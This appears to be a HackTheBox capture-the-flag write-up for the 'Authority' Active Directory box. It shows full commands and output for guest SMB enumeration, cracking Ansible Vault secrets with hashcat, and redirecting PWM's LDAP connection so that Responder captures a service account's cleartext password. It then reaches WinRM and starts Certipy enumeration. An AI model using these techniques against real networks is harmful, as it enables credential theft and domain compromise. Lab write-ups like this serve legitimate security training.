---
title: "HTB: Authority - PWM, Responder LDAP Capture & ESC1 to DCSync"
date: 2026-06-30
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "Ansible Vault", "AD CS", "ESC1", "DCSync"]
categories: ["Writeups"]
description: "Walkthrough of the Authority Windows Active Directory box: cracking an Ansible Vault found on an SMB share, hijacking PWM's LDAP config with Responder to capture a service account in cleartext, abusing MachineAccountQuota and an ESC1 certificate template, and a final DCSync to Administrator."
os: Windows
difficulty: Medium
status: Complete
platforms: ["HackTheBox"]
oses: ["Windows"]
difficulties: ["Medium"]
---

# 🚩 Box Name: Authority

## 📋 Initial Info
- **Hostname:** `target.htb`

Authority is a medium-difficulty Windows machine that shows exactly how a chain of minor slipups can compromise an entire enterprise. I start by hunting through network shares, where human error like password reuse and poorly stored credentials gives me an initial foothold.

From there, it is all about exploiting Active Directory. I combine a seemingly harmless default setting where any standard user can add up to 10 computers to the domain with a misconfigured AD CS certificate template. By chaining these two issues together, I take over the domain.

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

#### nmap Scan
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 15:16 CDT
Warning: 10.129.229.56 giving up on port because retransmission cap hit (6).
Stats: 0:12:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.14% done; ETC: 15:33 (0:04:05 remaining)
Nmap scan report for 10.129.229.56
Host is up (0.051s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 00:33:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T00:34:32+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T00:34:32+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T00:34:32+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T00:34:32+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2026-06-28T23:48:12
|_Not valid after:  2028-06-30T11:26:36
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
52991/tcp open  msrpc         Microsoft Windows RPC
53037/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/30%OT=53%CT=1%CU=35157%PV=Y%DS=2%DC=T%G=Y%TM=6A44285
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=109%GCD=1%ISR
OS:=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FB%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=
OS:S%TS=U)SEQ(SP=FC%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8NN
OS:S%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(W1
OS:=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O
OS:=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-01T00:34:25
|_  start_date: N/A
|_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m02s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   58.56 ms 10.10.14.1
2   58.62 ms 10.129.229.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1062.76 seconds
```

Immediately, several things jump out.
- DNS is running on **port 53**, meaning the machine is acting as a DNS server.
- Kerberos, LDAP, SMB, and Global Catalog ports are all present, strongly suggesting I'm looking at a **Domain Controller**.
- WinRM is exposed on **5985**, which could become useful later if I recover valid credentials.
- Port **8443** is running Apache Tomcat over HTTPS instead of the more common IIS service.
- LDAP certificates reveal the internal domain name: `authority.htb.corp`

Nmap also confirms the machine name is **AUTHORITY**, and SMB signing is required.

Nothing here screams "instant shell," but I now have a pretty good picture of the environment. This is an Active Directory network, so chances are my initial foothold won't come from exploiting software it'll come from finding credentials.

### 🔎 DNS Enumeration

Since the machine is hosting DNS, it's always worth seeing what information I can squeeze out of it.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ dig any authority.htb @10.129.229.56                                                                                                                                      ──(Tue,Jun30)─┘

; <<>> DiG 9.20.23-1~deb13u1-Debian <<>> any authority.htb @10.129.229.56
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59606
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.                 IN      ANY

;; ANSWER SECTION:
authority.htb.          600     IN      A       10.129.229.56
authority.htb.          3600    IN      NS      authority.authority.htb.
authority.htb.          3600    IN      SOA     authority.authority.htb. hostmaster.htb.corp. 191 900 600 86400 3600
authority.htb.          600     IN      AAAA    dead:beef::1d1
authority.htb.          600     IN      AAAA    dead:beef::3456:a3fb:e0d9:f292

;; ADDITIONAL SECTION:
authority.authority.htb. 3600   IN      A       10.129.229.56
authority.authority.htb. 3600   IN      AAAA    dead:beef::3456:a3fb:e0d9:f292
authority.authority.htb. 3600   IN      AAAA    dead:beef::1d1

;; Query time: 58 msec
;; SERVER: 10.129.229.56#53(10.129.229.56) (TCP)
;; WHEN: Tue Jun 30 15:43:28 CDT 2026
;; MSG SIZE  rcvd: 265
```

The response doesn't reveal any hidden hosts, but it does confirm a few useful details.

- The target resolves correctly.
- The DNS server is authoritative for the zone.
- IPv6 is enabled.
- The internal DNS server is named: `authority.authority.htb`

While there aren't any subdomains hiding here, it's still useful to verify that DNS is functioning correctly before moving on. Sometimes zone transfers or additional records are available.

### 🌐 Web Enumeration

The Nmap scan showed two web services:
- **Port 80 (IIS)**
- **Port 8443 (Apache Tomcat)**

I started with the default web server on port 80. The site contains nothing more than the default IIS landing page.

![Default IIS landing page on port 80](/images/authority/80.png)

No links.
No source code comments.
No hidden functionality.

Time to move on. Fortunately, port **8443** turned out to be much more interesting. Instead of another generic webpage, I was greeted by a login portal for **PWM**.

![PWM login portal on port 8443](/images/authority/8443.png)

PWM is an open-source Java application designed to let users manage their Active Directory passwords without needing to call the help desk every Monday morning because they forgot it over the weekend. It supports password resets, account management, and LDAP integration, making it a pretty common choice in enterprise environments. Since it presented a login page, I tried checking for default credentials.

A handful of common username/password combinations didn't work, so rather than brute-force a login page with zero evidence, I moved on.

### 📂 SMB Enumeration

Whenever I see Windows, SMB is usually my next stop.

I started by checking whether anonymous access was allowed.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ nxc smb authority.htb -u '' -p ''                                                                                                                                         ──(Tue,Jun30)─┘
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\:
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ nxc smb authority.htb -u 'bob' -p ''                                                                                                                                      ──(Tue,Jun30)─┘
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\bob: (Guest)
```

The server reported that **Null Authentication** was enabled. Even more interesting, connecting with a completely made-up username and an empty password automatically authenticated me as the **Guest** account.

I next enumerated the available shares.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ nxc smb authority.htb -u 'bob' -p '' --shares                                                                                                                             ──(Tue,Jun30)─┘
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\bob: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares
SMB         10.129.229.56   445    AUTHORITY        Development     READ
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share
```

Most of the standard administrative shares are inaccessible, but one share stood out. I have access to the Development Share.

Connecting with `smbclient`, I began exploring the directory structure.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ smbclient //authority.htb/Development -U bob                                                                                                                          1 ↵ ──(Tue,Jun30)─┘
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 08:20:38 2023
  ..                                  D        0  Fri Mar 17 08:20:38 2023
  Automation                          D        0  Fri Mar 17 08:20:40 2023

                5888511 blocks of size 4096. 1396516 blocks available
smb: \> cd Automation\
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 08:20:40 2023
  ..                                  D        0  Fri Mar 17 08:20:40 2023
  Ansible                             D        0  Fri Mar 17 08:20:50 2023

                5888511 blocks of size 4096. 1396455 blocks available
smb: \Automation\> cd Ansible\
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 08:20:50 2023
  ..                                  D        0  Fri Mar 17 08:20:50 2023
  ADCS                                D        0  Fri Mar 17 08:20:48 2023
  LDAP                                D        0  Fri Mar 17 08:20:48 2023
  PWM                                 D        0  Fri Mar 17 08:20:48 2023
  SHARE                               D        0  Fri Mar 17 08:20:48 2023
```

The share contains an **Automation** directory. Inside that is an **Ansible** project.

This isn't just random documentation it looks like the actual deployment files used to build the environment.

Configuration management projects are always worth investigating because they frequently contain configuration files, scripts, credentials, or secrets that administrators assume nobody outside the organization can ever see.

### Digging Through the Files

I started searching through the various directories looking for anything interesting. The LDAP folder contains a small `TODO.md` file.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/SMB_Loot]
└─❯ cat TODO.md                                                               ──(Tue,Jun30)─┘
- Change LDAP admin password after build -[COMPLETE]
- add tests for ubuntu 14, 16, debian 7 and 8, and centos 6 and 7
```

Nothing groundbreaking, but it confirms these were genuine deployment files rather than sample templates. The PWM directory turns out to be much more rewarding. Inside the `templates` folder I found a `tomcat-users.xml.j2` template.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/SMB_Loot]
└─❯ cat tomcat-users.xml.j2                                                   ──(Tue,Jun30)─┘
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

Seeing plaintext credentials always gets my attention, but there's an important detail here. Notice the file extension: `j2`

This is a **Jinja2 template** used by Ansible during deployment. These credentials are simply the values that would be written into Tomcat when the application is installed. That doesn't necessarily mean they're still valid on the live server. I tried them anyway with no luck.

### 🔐Ansible Vault

While digging through the project files, I came across a `main.yml` file containing several encrypted values.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/SMB_Loot]
└─❯ cat main.yml                                                              ──(Tue,Jun30)─┘
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764%
```

Now things are getting interesting. These aren't password hashes they're **Ansible Vault** secrets.

Ansible Vault is used to encrypt sensitive values such as passwords, API keys, and service accounts so they aren't stored in plaintext inside configuration files. As long as the vault password remains secret, the encrypted values are effectively useless to an attacker.

Fortunately for me, "secure" and "uncrackable" are two very different things.

Before attempting to crack them, there's one small hurdle. Each encrypted blob has to be saved into its own file. Tools like `ansible2john` expect a single vault object, so feeding them the entire YAML file won't work.

I created three separate files one for each encrypted secret and prepared them for cracking.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible2john ansible_vault1                                                ──(Tue,Jun30)─┘
ansible_vault1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible2john ansible_vault2                                                ──(Tue,Jun30)─┘
ansible_vault2:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible2john ansible_vault3                                                ──(Tue,Jun30)─┘
ansible_vault3:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

Each command produces a hash in a format compatible with John the Ripper and Hashcat. Since I already have three hashes, I combine them into a single file named `hashes` and let Hashcat do the rest.

### Hashcat

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ hashcat -m 16900 hashes /usr/share/wordlists/rockyou.txt                   ──(Tue,Jun30)─┘
hashcat (v6.2.6) starting
<SNIP>

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16900 (Ansible Vault)
Hash.Target......: hashes
Time.Started.....: Tue Jun 30 18:43:40 2026 (47 secs)
Time.Estimated...: Tue Jun 30 18:44:27 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2584 H/s (9.73ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 119808/43033155 (0.28%)
Rejected.........: 0/119808 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: treetree -> prospect
Hardware.Mon.#1..: Util: 96%

Started: Tue Jun 30 18:43:21 2026
Stopped: Tue Jun 30 18:44:28 2026
```

Mode **16900** tells Hashcat that I'm attacking Ansible Vault hashes. Within a minute, Hashcat cracks all three hashes. The vault password turns out to be:

`!@#$%^&*`

The encryption itself is perfectly secure. The password protecting it not so much.

### 🔐Decrypting secrets

Now that I know the vault password, recovering the plaintext values is easy. I create a small Python virtual environment so I don't clutter my system with additional packages.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ python3 -m venv ANSIBLE                                                    ──(Tue,Jun30)─┘
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ source ANSIBLE/bin/activate                                                ──(Tue,Jun30)─┘
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ pip install ansible-vault                                                  ──(Tue,Jun30)─┘
Collecting ansible-vault
<SNIP>
 pycparser-3.0 resolvelib-1.2.1
```

Next, I install the `ansible-vault` utility.

With everything installed, I decrypt each vault individually. Each time I'm prompted for the vault password, I enter: `!@#$%^&*`

```shell
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ls                                                                         ──(Tue,Jun30)─┘
ANSIBLE  ansible_vault1  ansible_vault2  ansible_vault3  hashes  main.yml  nmap  SMB_Loot
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible-vault decrypt ansible_vault1                                       ──(Tue,Jun30)─┘
Vault password:
Decryption successful
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible-vault decrypt ansible_vault2                                       ──(Tue,Jun30)─┘
Vault password:
Decryption successful
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ ansible-vault decrypt ansible_vault3                                       ──(Tue,Jun30)─┘
Vault password:
Decryption successful
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ cat ansible_vault1                                                         ──(Tue,Jun30)─┘
svc_pwm%
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ cat ansible_vault2                                                         ──(Tue,Jun30)─┘
pWm_@dm!N_!23%
(ANSIBLE) ┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ cat ansible_vault3                                                         ──(Tue,Jun30)─┘
DevT3st@123%
```

After a successful decryption, the encrypted blobs are replaced with their plaintext values.

- The first vault contains the PWM administrator username.
svc_pwm

- The second reveals the PWM administrator password.
`pWm_@dm!N_!23`

- Finally, the third vault contains the LDAP administrator password.
`DevT3st@123%`

At this point, I've recovered three valuable secrets. This is exactly why configuration repositories are such attractive targets during an engagement. Administrators often do the right thing by encrypting sensitive values, but all of that protection disappears if the vault password is weak enough to crack with a common wordlist.

Now I have a fresh set of credentials, the next question is simply "Where do they work?"

---

## ⚡ Exploitation (Initial Access)
### Discovery

Earlier during web enumeration, I discovered the **PWM Configuration Manager** login page but didn't have any valid credentials to authenticate. Now that I've cracked the Ansible Vault, it's time to revisit it.

I try logging into the Configuration Manager using the recovered credentials, and this time I'm in. `pWm_@dm!N_!23` works! This confirms the credentials stored in the Ansible Vault are still valid on the production system.

### Foothold

Since I wasn't familiar with how PWM works, I spend a few minutes reading through the documentation and exploring the interface.

The first thing I notice is the **Configuration Editor**.

![PWM Configuration Manager landing page](/images/authority/configmanager.png)

After selecting **Configuration Editor**, PWM redirects me to an interface containing nearly every configuration option for the application.

![PWM Configuration Editor interface](/images/authority/configeditor.png)

The interface is fairly well organized, with configuration categories listed in a navigation pane on the left. Since PWM authenticates users against LDAP, that's where I start looking. I found a way to generate an LDAP request by clicking on:

LDAP => LDAP Directories => default => Connection

![PWM LDAP connection settings page](/images/authority/connection.png)

This page contains the LDAP connection settings used by PWM whenever it communicates with the domain controller. The `LDAP URLs` field catches my attention. Instead of being hardcoded, the LDAP server address is completely configurable. In the LDAP URLs field, I can add a URL. I next add a URL that points to my attacker machine.

![Adding attacker-controlled URL to LDAP URLs field](/images/authority/ldapurls.png)

If I replace the legitimate LDAP server with one under my control, PWM will attempt to authenticate against my malicious server instead. It will do so using the service account configured for LDAP authentication. Sometimes the best exploits don't involve exploiting software at all they simply involve convincing software to do exactly what it was designed to do.

### Setting Up a Malicious LDAP Server

Before changing the LDAP URL, I need something capable of impersonating an LDAP server. Fortunately, **Responder** already includes one. I start Responder and bind it to my VPN interface.

Responder to set up my malicious LDAP server.
```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ sudo responder -I tun0                                                                                                                                              127 ↵ ──(Wed,Jul01)─┘
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
```

By default, Responder enables a number of rogue services, including an LDAP server capable of capturing authentication attempts. Once it's listening, I return to PWM and replace the LDAP URL with the IP address of my attacking machine.

![Setting LDAP URL to attacker IP in PWM](/images/authority/attackerip.png)

PWM provides a **Test LDAP Profile** button that allows administrators to verify their LDAP configuration before saving it. Normally this sends a test request to the configured LDAP server. Unfortunately for the administrators the configured LDAP server is my attacker machine.

![PWM Test LDAP Profile button](/images/authority/request.png)

I click **Test LDAP Profile**. Less than a second later, Responder lights up.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ sudo responder -I tun0                                                                                                                                              127 ↵ ──(Wed,Jul01)─┘
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

<SNIP>

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server                [ON]
<SNIP>

[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.25.76
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Not only does PWM connect to my rogue LDAP server, but it authenticates using the LDAP service account and sends its credentials **in cleartext**. The recovered credentials are:

`svc_ldap:lDaP_1n_th3_cle4r!`

As amusing as the password is, it's also a reminder that service account credentials are often treated as "set it and forget it." Once they're configured, they rarely change, making them extremely valuable targets during an engagement.

### Verifying Access

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ nxc winrm authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'                                                                                                             ──(Wed,Jul01)─┘
WINRM       10.129.25.76    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.25.76    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

The `svc_ldap` account has permission to authenticate over WinRM, giving me my initial foothold on the machine. From here, I can establish a remote PowerShell session and begin enumerating the system from the inside.

## 🛡️ Privilege Escalation

Once I have a shell as `svc_ldap`, I start looking for obvious privilege escalation opportunities.

At first glance, the account doesn't appear to have any interesting group memberships or special privileges. Rather than manually inspecting every Active Directory object, I collect data with **SharpHound** and load it into BloodHound.

![BloodHound data loaded showing svc_ldap's object control](/images/authority/bhdata.png)

BloodHound maps relationships inside Active Directory and often reveals attack paths that would be difficult to spot manually. Looking at the **Outbound Object Control** for my compromised user, one object immediately catches my attention.

`AUTHORITY-CA`

That name suggests Active Directory Certificate Services (AD CS) is deployed in the environment. If you've never encountered AD CS before, don't worry I hadn't either when I first started learning it.

Think of AD CS as the domain's digital passport office. Instead of issuing passports, it issues **certificates** that prove someone's identity. Windows can then use those certificates for authentication instead of passwords. If the certificate authority is configured securely, this works exactly as intended. If it isn't you can sometimes convince it to issue you a certificate that says you're Administrator.

### Enumerating AD CS

To check whether the certificate authority is vulnerable, I use Certipy. Certipy performs all the hard work of enumerating the Certificate Authority, its templates, and any known misconfigurations. The output is fairly large, but most of it isn't immediately important.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ certipy-ad find -vulnerable -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.25.76 -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
